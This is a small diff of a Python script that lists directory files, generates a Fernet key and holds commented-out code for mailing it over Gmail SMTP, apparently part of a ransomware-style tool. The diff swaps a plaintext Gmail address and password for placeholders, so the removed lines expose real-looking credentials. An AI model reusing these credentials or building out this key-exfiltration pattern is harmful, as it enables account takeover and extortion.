@@ -16,8 +16,8 @@ for file in os.listdir():
 print(f"{file_list} \n")
 key=Fernet.generate_key()
 print(f"key= {key}")
-mail="miracberktasdemir202@gmail.com"
-passwd="berk2011"
+mail="gmail"
+passwd="gmailpassword"
 print("beni bulmanız daha kolay.D")
 #def send_key_code(key):
     #email_server=smtplib.SMTP("smtp.gmail.com",587)
